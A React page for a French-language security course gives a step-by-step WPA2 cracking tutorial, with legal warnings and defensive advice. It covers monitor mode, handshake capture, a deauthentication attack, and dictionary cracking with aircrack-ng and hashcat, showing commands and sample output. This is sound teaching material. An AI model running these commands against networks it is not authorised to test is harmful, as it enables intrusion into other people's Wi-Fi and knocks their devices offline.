
'use client';

import { CourseLayout } from "@/components/CourseLayout";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Lock, Radio, Key, AlertTriangle, Info, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import Link from "next/link";

export default function WPA2CrackingPage() {
  return (
    <CourseLayout title="Cracker WPA2">
      <div className="space-y-8">
        {/* Introduction */}
        <section className="space-y-4">
          <p className="text-lg text-muted-foreground">
            Dans ce module, vous apprendrez les techniques de cracking WPA2 à des fins éducatives. 
            Ces connaissances vous permettront de comprendre les vulnérabilités et de mieux sécuriser 
            vos propres réseaux.
          </p>
          
          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              <strong>Avertissement légal :</strong> Le cracking de réseaux Wi-Fi sans autorisation 
              est illégal. Utilisez ces techniques uniquement sur vos propres réseaux ou dans un 
              environnement de test autorisé.
            </AlertDescription>
          </Alert>
        </section>

        {/* Comprendre WPA2 */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold">Comprendre WPA2</h2>
          
          <Card>
            <CardHeader>
              <CardTitle>Fonctionnement de WPA2</CardTitle>
              <CardDescription>Les bases du protocole de sécurité Wi-Fi</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-sm text-muted-foreground">
                WPA2 (Wi-Fi Protected Access 2) utilise le chiffrement AES et le protocole 
                4-way handshake pour sécuriser les connexions Wi-Fi.
              </p>
              
              <div className="space-y-3">
                <h4 className="font-semibold">Le 4-way handshake</h4>
                <p className="text-sm text-muted-foreground">
                  Lorsqu'un appareil se connecte à un réseau WPA2, un échange de 4 messages 
                  (handshake) a lieu entre le client et le point d'accès :
                </p>
                <ol className="list-decimal list-inside space-y-2 text-sm text-muted-foreground">
                  <li>Le point d'accès envoie un nonce (nombre aléatoire) au client</li>
                  <li>Le client répond avec son propre nonce et un MIC (Message Integrity Code)</li>
                  <li>Le point d'accès envoie la clé de groupe chiffrée</li>
                  <li>Le client confirme la réception</li>
                </ol>
                <Alert>
                  <Info className="h-4 w-4" />
                  <AlertDescription>
                    Le handshake contient suffisamment d'informations pour tester des mots de passe 
                    hors ligne, c'est pourquoi sa capture est cruciale pour le cracking.
                  </AlertDescription>
                </Alert>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Étape 1 : Mode Monitor */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Radio className="h-8 w-8 text-primary" />
            Étape 1 : Mettre la carte en mode monitor
          </h2>

          <Card>
            <CardHeader>
              <CardTitle>Activer le mode monitor avec airmon-ng</CardTitle>
              <CardDescription>Préparer votre carte Wi-Fi pour la capture</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-3">
                <h4 className="font-semibold">1. Vérifier les interfaces disponibles</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Lister les interfaces Wi-Fi</div>
                  <div>sudo airmon-ng</div>
                  <div className="mt-3 text-muted-foreground"># Résultat :</div>
                  <div>PHY     Interface   Driver      Chipset</div>
                  <div>phy0    wlan0       ath9k       Atheros AR9285</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">2. Arrêter les processus interférents</h4>
                <p className="text-sm text-muted-foreground">
                  Certains processus peuvent interférer avec le mode monitor.
                </p>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Tuer les processus problématiques</div>
                  <div>sudo airmon-ng check kill</div>
                  <div className="mt-3 text-muted-foreground"># Processus arrêtés :</div>
                  <div>Killing these processes:</div>
                  <div>  PID Name</div>
                  <div>  1234 NetworkManager</div>
                  <div>  5678 wpa_supplicant</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">3. Activer le mode monitor</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Activer le mode monitor</div>
                  <div>sudo airmon-ng start wlan0</div>
                  <div className="mt-3 text-muted-foreground"># Résultat :</div>
                  <div className="text-green-600">Mode monitor enabled on wlan0mon</div>
                  <div className="mt-3 text-muted-foreground"># Vérifier l'activation</div>
                  <div>iwconfig</div>
                  <div className="mt-2">wlan0mon  IEEE 802.11  Mode:Monitor</div>
                </div>
              </div>

              <Alert>
                <Info className="h-4 w-4" />
                <AlertDescription>
                  <strong>Note :</strong> L'interface change généralement de nom (wlan0 → wlan0mon). 
                  Utilisez ce nouveau nom pour les commandes suivantes.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </section>

        {/* Étape 2 : Capture Handshake */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Lock className="h-8 w-8 text-primary" />
            Étape 2 : Capturer le handshake
          </h2>

          <Card>
            <CardHeader>
              <CardTitle>Utiliser airodump-ng pour capturer le handshake</CardTitle>
              <CardDescription>La clé pour cracker le mot de passe</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-3">
                <h4 className="font-semibold">1. Scanner les réseaux disponibles</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Scanner tous les réseaux</div>
                  <div>sudo airodump-ng wlan0mon</div>
                  <div className="mt-3 text-muted-foreground"># Résultat :</div>
                  <div>BSSID              PWR  Beacons  CH  ENC  ESSID</div>
                  <div>AA:BB:CC:DD:EE:FF  -45  120      6   WPA2 MonReseau</div>
                  <div>11:22:33:44:55:66  -67  85       11  WPA2 AutreReseau</div>
                </div>
                <p className="text-sm text-muted-foreground">
                  Notez le BSSID (adresse MAC) et le canal (CH) du réseau cible.
                </p>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">2. Capturer sur le réseau cible</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Capturer sur un réseau spécifique</div>
                  <div>sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</div>
                  <div className="mt-2 text-muted-foreground"># Explication des options :</div>
                  <div>-c 6                    : Canal du réseau</div>
                  <div>--bssid AA:BB:CC:...    : Adresse MAC du point d'accès</div>
                  <div>-w capture              : Préfixe des fichiers de capture</div>
                  <div>wlan0mon                : Interface en mode monitor</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">3. Attendre la capture du handshake</h4>
                <p className="text-sm text-muted-foreground">
                  Le handshake est capturé lorsqu'un appareil se connecte au réseau. 
                  Vous verrez ce message en haut à droite de l'écran :
                </p>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-green-600">[ WPA handshake: AA:BB:CC:DD:EE:FF ]</div>
                </div>
                <Alert>
                  <CheckCircle2 className="h-4 w-4" />
                  <AlertDescription>
                    <strong>Succès !</strong> Le handshake a été capturé. Vous pouvez maintenant 
                    arrêter la capture avec Ctrl+C. Les fichiers seront sauvegardés avec le préfixe 
                    "capture" (capture-01.cap, capture-01.csv, etc.).
                  </AlertDescription>
                </Alert>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">Méthode alternative : Déauthentification</h4>
                <p className="text-sm text-muted-foreground">
                  Si aucun appareil ne se connecte naturellement, vous pouvez forcer une 
                  reconnexion (uniquement sur vos propres réseaux) :
                </p>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Dans un nouveau terminal</div>
                  <div>sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</div>
                  <div className="mt-2 text-muted-foreground"># Options :</div>
                  <div>--deauth 10 : Envoyer 10 paquets de déauthentification</div>
                  <div>-a : BSSID du point d'accès</div>
                </div>
                <Alert>
                  <AlertTriangle className="h-4 w-4" />
                  <AlertDescription>
                    <strong>Attention :</strong> La déauthentification force les appareils à se 
                    déconnecter. N'utilisez cette technique que sur vos propres réseaux.
                  </AlertDescription>
                </Alert>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Étape 3 : Cracker le mot de passe */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Key className="h-8 w-8 text-primary" />
            Étape 3 : Cracker le mot de passe
          </h2>

          <Card>
            <CardHeader>
              <CardTitle>Utiliser aircrack-ng avec une wordlist</CardTitle>
              <CardDescription>Tester des mots de passe contre le handshake capturé</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-3">
                <h4 className="font-semibold">1. Préparer la wordlist rockyou.txt</h4>
                <p className="text-sm text-muted-foreground">
                  Rockyou.txt est une liste de 14 millions de mots de passe couramment utilisés, 
                  incluse dans Kali Linux.
                </p>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Localiser rockyou.txt</div>
                  <div>locate rockyou.txt</div>
                  <div className="mt-2">/usr/share/wordlists/rockyou.txt.gz</div>
                  <div className="mt-3 text-muted-foreground"># Décompresser si nécessaire</div>
                  <div>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">2. Lancer aircrack-ng</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Cracker avec rockyou.txt</div>
                  <div>sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap</div>
                  <div className="mt-2 text-muted-foreground"># Options :</div>
                  <div>-w : Chemin vers la wordlist</div>
                  <div>-b : BSSID du réseau cible</div>
                  <div>capture-01.cap : Fichier contenant le handshake</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">3. Résultats possibles</h4>
                
                <div className="space-y-3">
                  <p className="text-sm font-semibold text-green-600">Cas 1 : Mot de passe trouvé</p>
                  <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                    <div>Aircrack-ng 1.6</div>
                    <div className="mt-2">[00:02:15] 45678/14344391 keys tested (350.25 k/s)</div>
                    <div className="mt-2 text-green-600">KEY FOUND! [ password123 ]</div>
                    <div className="mt-2">Master Key     : AB CD EF 01 23 45 67 89...</div>
                    <div>Transient Key  : 12 34 56 78 90 AB CD EF...</div>
                  </div>
                  <Alert>
                    <CheckCircle2 className="h-4 w-4" />
                    <AlertDescription>
                      <strong>Succès !</strong> Le mot de passe a été trouvé. Dans cet exemple, 
                      c'est "password123". Le temps de cracking dépend de la complexité du mot de passe 
                      et de la puissance de votre processeur.
                    </AlertDescription>
                  </Alert>
                </div>

                <div className="space-y-3">
                  <p className="text-sm font-semibold text-orange-600">Cas 2 : Mot de passe non trouvé</p>
                  <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                    <div>Aircrack-ng 1.6</div>
                    <div className="mt-2">[01:45:30] 14344391/14344391 keys tested (2500.12 k/s)</div>
                    <div className="mt-2 text-orange-600">KEY NOT FOUND</div>
                    <div className="mt-2">Passphrase not in dictionary</div>
                  </div>
                  <p className="text-sm text-muted-foreground">
                    Si le mot de passe n'est pas dans la wordlist, vous devrez :
                  </p>
                  <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground">
                    <li>Utiliser une wordlist plus complète</li>
                    <li>Créer une wordlist personnalisée avec crunch ou cupp</li>
                    <li>Utiliser des règles de mutation avec hashcat</li>
                    <li>Accepter que le mot de passe soit trop fort pour être cracké</li>
                  </ul>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">Optimisation avec hashcat (optionnel)</h4>
                <p className="text-sm text-muted-foreground">
                  Hashcat est plus rapide qu'aircrack-ng, surtout avec un GPU.
                </p>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Convertir le fichier .cap en format hashcat</div>
                  <div>aircrack-ng capture-01.cap -J capture</div>
                  <div className="mt-3 text-muted-foreground"># Cracker avec hashcat</div>
                  <div>hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt</div>
                </div>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Facteurs de succès */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold">Facteurs de succès</h2>
          
          <Card>
            <CardHeader>
              <CardTitle>Quand le cracking fonctionne-t-il ?</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-3">
                <h4 className="font-semibold text-green-600">Mots de passe faibles (faciles à cracker)</h4>
                <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground">
                  <li>Mots du dictionnaire : "password", "welcome", "admin"</li>
                  <li>Mots de passe courts : moins de 8 caractères</li>
                  <li>Patterns simples : "12345678", "qwerty", "azerty"</li>
                  <li>Informations personnelles : prénoms, dates de naissance</li>
                  <li>Mots de passe courants : "password123", "admin2024"</li>
                </ul>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold text-red-600">Mots de passe forts (difficiles/impossibles à cracker)</h4>
                <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground">
                  <li>Longueur ≥ 12 caractères</li>
                  <li>Mélange de majuscules, minuscules, chiffres et symboles</li>
                  <li>Pas de mots du dictionnaire</li>
                  <li>Généré aléatoirement : "K9#mP2$xL5@nQ8"</li>
                  <li>Phrase de passe longue : "J'aime-les-Pizzas-au-Fromage-2024!"</li>
                </ul>
              </div>

              <Alert>
                <Info className="h-4 w-4" />
                <AlertDescription>
                  <strong>Temps de cracking estimé :</strong> Un mot de passe de 8 caractères 
                  (lettres minuscules uniquement) peut être cracké en quelques heures. Un mot de passe 
                  de 12 caractères avec majuscules, minuscules, chiffres et symboles prendrait des 
                  milliers d'années avec le matériel actuel.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </section>

        {/* Conseils de sécurité */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold">Protéger votre réseau Wi-Fi</h2>
          
          <Card>
            <CardHeader>
              <CardTitle>Bonnes pratiques de sécurité</CardTitle>
            </CardHeader>
            <CardContent>
              <ul className="space-y-2 text-sm text-muted-foreground">
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Utilisez un mot de passe d'au moins 12 caractères</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Mélangez majuscules, minuscules, chiffres et symboles</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Évitez les mots du dictionnaire et les informations personnelles</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Changez le mot de passe par défaut de votre routeur</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Désactivez le WPS (Wi-Fi Protected Setup)</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Mettez à jour régulièrement le firmware de votre routeur</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle2 className="h-5 w-5 text-green-600 shrink-0 mt-0.5" />
                  <span>Passez à WPA3 si votre matériel le supporte</span>
                </li>
              </ul>
            </CardContent>
          </Card>
        </section>

        {/* Navigation */}
        <div className="flex justify-between pt-8 border-t">
          <Button asChild variant="outline">
            <Link href="/courses/network-testing">
              ← Précédent : Tester son réseau
            </Link>
          </Button>
          <Button asChild>
            <Link href="/courses/wpa3">
              Suivant : Comprendre WPA3 →
            </Link>
          </Button>
        </div>
      </div>
    </CourseLayout>
  );
}
